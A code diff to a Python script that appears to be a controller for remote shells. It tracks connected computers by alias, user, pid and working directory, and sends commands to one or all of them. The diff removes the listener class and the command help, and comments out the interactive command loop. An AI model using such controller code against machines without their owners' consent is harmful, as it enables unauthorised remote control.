@@ -12,43 +12,6 @@ global req_head, flag
 flag = False
 
 
-class Connect(BaseHTTPRequestHandler):
-    global req_head
-    def __init__(self, ops_cle='windows', user_cle='', pid_cle='', pwd_cle='', clientip_cle='', server_address=(), alias_cle=''):
-        # super(Connect, self).__init__()
-        self.alias_cle = alias_cle
-        self.ops_cle = ops_cle
-        self.user_cle = user_cle
-        self.pid_cle = pid_cle
-        self.pwd_cle = pwd_cle
-        self.s = ''
-        self.cont = ''
-        self.serv_ip = server_address[0]
-        self.serv_port = server_address[1]
-        self.server_address = server_address
-        self.clientip_cle = clientip_cle
-        self.client = ''
-        self.addr = ''
-
-    def initiate(self):
-        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
-        self.s.bind((self.server_address))
-        self.s.listen(5)
-        # self.s = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
-        # self.s.load_cert_chain("D:\\certs\\cert.pem", "D:\\certs\\key.pem")
-        # self.s = s.wrap_socket(ss, server_side=True)
-        self.client, self.addr = self.s.accept()
-
-    def send(self, cmd=''):
-        self.client.send(cmd.encode('cp65001'))
-
-    def recv(self):
-        return self.client.recv(1024).decode('cp65001')
-
-    def close(self):
-        self.s.close()
-
-
 class Server(BaseHTTPRequestHandler):
     # def __init__(self, user='', pid='', pwd=''):
         # super(Server, self).__init__()
@@ -88,62 +51,6 @@ def send_all(clients, command):
         c.close()
 
 
-def prety(clients):
-    strin = {'alias': 5, 'ops': 3, 'user': 4, 'pid': 3, 'pwd': 3, 'clientip': 8}
-    stri = '│ alias │ ops │ user │ pid │ pwd │ clientip │'
-
-    for i in clients:
-        o = 5
-        head = '┌'
-        bottom = '└'
-        c = clients[i]
-        k = c.__dict__
-        for el in k:
-            if 'cle' in el:
-                name = el.split('_')[0]
-                strin[name] = max(strin[name], len(k[el]))
-                o += strin[name] + 2
-                head += '─' * (strin[name] + 2) + '┬'
-                bottom += '─' * (strin[name] + 2) + '┴'
-
-        head = head[0:-1] + '┐'
-        bottom = bottom[0:-1] + '┘'
-
-    if clients != {}:
-        s = '├'
-
-        print(head)
-
-        for word in stri.split('│')[1:-1]:
-            word = word[1:-1]
-            print('│' + ' ' * (strin[word] - len(word) + 1) + word + ' ', end='')
-            s += '─' * (strin[word] + 1) + '─' + '┼'
-        s = s[0:-1] + '┤'
-        print('│')
-
-        for i in clients:
-            print(s)
-            print('│', end='')
-            c = clients[i]
-            k = c.__dict__
-
-            for el in k:
-                if 'cle' in el:
-                    print(' ' * (strin[el.split('_')[0]] + 1 - len(k[el])) + f'{k[el]} │', end='')
-            print()
-        print(bottom)
-    else:
-        print('┌' + '─' * 6 + '┐')
-        print('│ None │')
-        print('└' + '─' * 6 + '┘')
-
-def help():
-    print(r"""
-    comps - display connected computers
-    connect [-A] - connect to computer with alias
-    alias [-pr_A] [-new_A] - rename connection from A to B
-    """)
-
 
 host = socket.getaddrinfo(socket.gethostname(), None)
 ipv4_addresses = [i[4][0] for i in host if i[0] == socket.AF_INET]
@@ -165,11 +72,15 @@ while True:
         client_ip = req_head.get('ip')
 
         cprint.warn(f'Connected from {client_ip} with alias {alias}')
-        c = Connect(user_cle=user, pid_cle=pid, pwd_cle=pwd, clientip_cle=client_ip, server_address=shell_address, alias_cle=str(alias))
+        c = (user, pid, pwd, client_ip, shell_address, str(alias))
         clients[str(alias)] = c
         alias += 1
+        with open("temp.db", "w") as f:
+            f.write(str(alias - 1) + "|" + str(c))
+            f.close()
         flag = False
 
+    """
     com = input("Command >> ").split()
     if com == ['help']:
         help()
@@ -218,5 +129,4 @@ while True:
     elif com == ['send_all']:
         com = input("Command for all >> ")
         send_all(clients, com)
-    
-    
+    """
